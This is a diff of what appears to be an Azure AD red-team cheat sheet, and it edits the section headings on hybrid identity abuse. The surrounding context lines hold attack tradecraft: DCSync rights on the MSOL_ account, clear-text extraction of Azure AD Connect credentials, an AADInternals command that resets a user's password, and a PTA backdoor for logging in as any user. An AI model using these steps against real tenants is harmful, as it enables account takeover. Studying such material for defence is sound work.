@@ -74,7 +74,8 @@ Get-AzureADServicePrincipal -All $true | ?{$_.DisplayName -eq "Finance Managemen
 Get-ApplicationProxyAssignedUsersAndGroups -ObjectId <OBJECT ID OF SERVICE PRINCIPAL>
 ```
 
-## Hybrid Identity - Password Hash Sync (PHS) Abuse
+## Hybrid Identity
+## Password Hash Sync (PHS) Abuse
 - Check if there is an account name with MSOL_<INSTALLATION ID>. This user has DCSYNC rights.
 - Passwords for both the accounts are stored in SQL server on the server where Azure AD Connect is installed and it is possible to extract them in clear-text if you have admin privileges on the server.
 
@@ -132,8 +133,7 @@ Get-AADIntUsers | ?{$_.DirSyncEnabled -ne "True"} | select UserPrincipalName,Obj
 Set-AADIntUserPassword -CloudAnchor "User_10caa362-7d18-48c9-a45b-9c3a78f3a96b" -Password "SuperSecretpass#12321" -Verbose
 ```
 
-
-## Hybrid Identity - Pass Through Authentication (PTA) Abuse
+## Pass Through Authentication (PTA) Abuse
 - Once we have admin access to an Azure AD connect server running PTA agent.
 - Once the backdoor is installed, we can authenticate as any user synced from onprem without knowing the correct password!
 
